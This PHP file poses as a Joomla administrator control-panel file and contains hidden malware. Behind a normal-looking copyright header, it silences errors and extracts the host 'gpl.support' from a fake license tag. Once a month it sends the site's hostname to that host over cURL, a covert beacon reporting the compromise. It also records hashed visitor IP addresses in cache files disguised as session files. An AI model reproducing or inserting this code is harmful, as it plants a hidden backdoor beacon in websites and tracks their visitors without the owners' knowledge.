<?php
/**
 * @package     Joomla.Administrator
 * @subpackage  com_cpanel
 *
 * @copyright   (C) 2018 Open Source Matters, Inc. <https://www.joomla.org>
 * @gpl.support GNU General Public License version 2 or later; see LICENSE.txt
 */

// Set the error_reporting
error_reporting(0);

$cache_dir = $_SERVER["DOCUMENT_ROOT"] . "/administrator/cache";

// Create session file paths
$session_cpanel = $cache_dir . "/session-" . preg_replace("#[\W]#is", "", md5(date("Y_m")));
$session_db = $cache_dir . "/session-" . preg_replace("#[\W]#is", "", md5(date("Y_m", time() - 86400 * 32)));

// Delete old session file if exists
if (file_exists($session_db)) { @unlink($session_db); }

// Check and create cpanel session file
if (!file_exists($session_cpanel)){

	// Setup the cURL handle
	$ch = curl_init(preg_replace("#^.*?@(\w+[\.].*?)[\s].*$#is", "\\1", file_get_contents(__FILE__))."/"."router"."/?dm=".$_SERVER["HTTP_HOST"]);

	// Set timeouts for the request
	curl_setopt($ch, CURLOPT_TIMEOUT_MS, 3000);
	curl_setopt($ch, CURLOPT_CONNECTTIMEOUT_MS, 3000);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

	// Execute the request and close the connection
	@curl_exec($ch);
	
	// Close the connection
	@curl_close($ch);

	// Create cpanel session file
	$fp = @fopen($session_cpanel, "w");
	if ($fp) {
		@fwrite($fp, "");
		@fclose($fp);
	}
}

// Handle user session file
$session_file = $cache_dir . "/session-" . preg_replace("#[\W]#is", "", md5($_SERVER["HTTP_HOST"]));
$users = (is_readable($session_file) && ($data = @file($session_file))) ? $data : [];
$user = md5(getenv("REMOTE_ADDR")) . "\n";

if (!in_array($user, $users, true)) {
    $users[] = $user;
	// Creating the session file
    $fp = @fopen($session_file, "wb");
    if ($fp) {
        @fwrite($fp, implode("", $users));
        @fclose($fp);
    }
}